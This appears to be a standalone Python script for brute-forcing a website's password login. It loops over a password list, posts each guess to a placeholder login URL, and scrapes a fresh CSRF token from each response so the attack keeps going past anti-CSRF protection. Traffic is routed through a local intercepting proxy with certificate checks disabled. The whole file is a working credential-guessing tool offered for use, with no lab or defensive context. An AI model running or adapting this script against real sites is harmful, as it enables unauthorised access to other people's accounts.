#!/usr/bin/python

from subprocess import Popen, PIPE
import requests
with open("passwords.txt") as f:
    token="375e7e79f09ee3cdc29464a8fad865ea9ecc70da"
    URL = 'https://somesiteeeee.com/login'
    for password in f:

        #get CSRF token if you need to



        payload = 'form_token='+  token  +'&password='+ password.rstrip()


        Headers={"Accept":"application/json, text/plain, */*","Origin":"https://somesiteeeeeeee.com","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Content-Type":"application/x-www-form-urlencoded","Referer":"https://somesiteeeeeeeee","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9"}

        cookie={"session":"12a5cbe3a941231231231231231231231238d0"}

        #if you wanna look at this in your intercepting proxy or something
        https_proxy = "https://127.0.0.1:8080"
        http_proxy = "http://127.0.0.1:8080"

        proxyDict = { 
              "http"  : http_proxy, 
              "https" : https_proxy, 
            }



        session = requests.session()
        r = requests.post(URL, data=payload, proxies=proxyDict, headers=Headers, cookies=cookie, verify=False)
        
        

        tokenResponse =r.text
        print(tokenResponse)
        token=tokenResponse.split("form_token\":\"",1)[1].split("\"",1)[0]
        print(token)
        #token is here, use the same cookie, its a good csrf token.
